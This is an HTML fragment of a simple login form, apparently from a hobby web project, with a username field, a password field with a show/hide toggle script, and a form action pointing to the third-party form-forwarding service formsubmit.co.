            <form class="form" id="login" method="post" action="https://formsubmit.co/9d7aa7dc4c161a0b1730b88fee745303">
                <h1 class="form__title">Login</h1>
                <div class="form__message form__message--error"><script>

                </script></div>
                <div class="form__input-group" id="EmailUser">
                    <input type="text email" name="Email" class="form__input form__input--error" autofocus placeholder="Username or Email">
                    <div class="form__input-error-message"></div>
                </div>
                <div  class="form__input-group P">
                    <input type="password" class="form__input form__input--error"  id="P" autofocus placeholder="Password">
                    <div class="show" id="togglePassword" onclick="showHide();"></div>
                    <script>
                        const password = document.querySelector("#P");
                        const togglePassword = document.querySelector("#togglePassword");

                        function showHide(){
                            if (password.type === 'password'){
                                password.setAttribute('type', 'text');
                                togglePassword.classList.remove('show')
                            }
                            else{
                                password.setAttribute('type', 'password');
                                togglePassword.classList.add('show')
                            }
                        }
                    </script>
                    <div class="form__input-error-message"></div>
                </div>
                <input class="form__button" type="button" value="Continue">
